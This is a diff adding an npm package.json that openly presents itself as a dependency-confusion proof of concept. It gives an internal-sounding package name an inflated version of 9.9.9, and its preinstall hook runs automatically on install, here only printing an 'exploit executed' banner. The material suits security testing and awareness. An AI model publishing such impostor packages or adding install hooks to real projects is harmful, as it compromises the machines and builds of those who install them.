@@ -1,0 +1,11 @@
+{
+  "name": "internal-utils",
+  "version": "9.9.9",
+  "description": "MALICIOUS IMPOSTER PACKAGE (Dependency Confusion Proof)",
+  "main": "index.js",
+  "scripts": {
+    "preinstall": "node -e 'console.log(\"==========================================\n🚨 EXPLOIT EXECUTED! DEPENDENCY CONFUSION SUCCESSFUL! 🚨\n==========================================\")'"
+  },
+  "author": "Attacker",
+  "license": "ISC"
+}
